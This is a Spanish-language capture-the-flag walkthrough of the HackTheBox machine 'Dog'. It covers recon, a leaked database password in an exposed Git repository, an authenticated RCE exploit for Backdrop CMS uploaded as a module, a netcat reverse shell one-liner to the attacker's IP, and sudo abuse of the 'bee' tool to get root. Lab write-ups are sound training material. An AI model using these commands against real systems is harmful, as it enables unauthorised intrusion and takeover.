# Writeup: HackTheBox - Dog

## NMAP results

```text
nmap -p- --open -v -sC -sV -Pn -oN nmap.txt 10.10.11.58
Nmap scan report for 10.10.11.58
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
```

Puerto 80 abierto con **Backdrop CMS 1.0.0** y repositorio Git expuesto.

## Git repository

Descarga del repositorio, restauración del proyecto y revisión del archivo de configuración:

```bash
wget --mirror -I .git http://10.10.11.58/.git/
cd 10.10.11.58/
git restore
cat settings.php
```

Encontramos una contraseña para el usuario **ROOT** en el archivo `settings.php` de acceso a la base de datos MySQL:

```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

## Enumeración de directorios

```bash
gobuster dir -w ./wordlists/common.txt -k -s 301,404 -x php,txt,py,cgi -u http://10.10.11.58
```

En la ruta `/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/` encontramos el archivo `update.settings.json` donde aparece el usuario `tiffany@dog.htb`.

## Explotación

Buscamos exploits para Backdrop CMS y encontramos uno para **Authenticated Remote Command Execution (RCE)**.

```bash
searchsploit backdrop
searchsploit -m 52021.py
python3 52021.py http://10.10.11.58
```

El exploit genera un archivo `shell.zip`.
> **Nota:** Si el servidor no permite archivos `.zip`, se puede modificar el exploit para usar `.tar.gz`.

```python
def create_tar(info_path, php_path):
    zip_filename = "shell.tar"
    with tarfile.open(zip_filename, 'w:gz') as tarf:
        tarf.add(info_path)
        tarf.add(php_path)
    return zip_filename
```

Subimos el archivo en `/admin/modules/install`. Luego, nos ponemos a la escucha con **netcat**:

```bash
ncat -nlvp 5555
```

Ejecutamos una reverse shell desde la web:
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [TU_IP] 5555 > /tmp/f
```

Estabilizamos la shell:
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
su johncusack # Usando la contraseña encontrada: BackDropJ2024DS2024
```

## Escalación de privilegios

Revisamos permisos de sudo:
```bash
sudo -l
# User johncusack may run: (ALL : ALL) /usr/local/bin/bee
```

El comando `bee` tiene una opción `eval` para ejecutar código PHP:
```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash -p');"
```

¡Ahora somos **ROOT**!
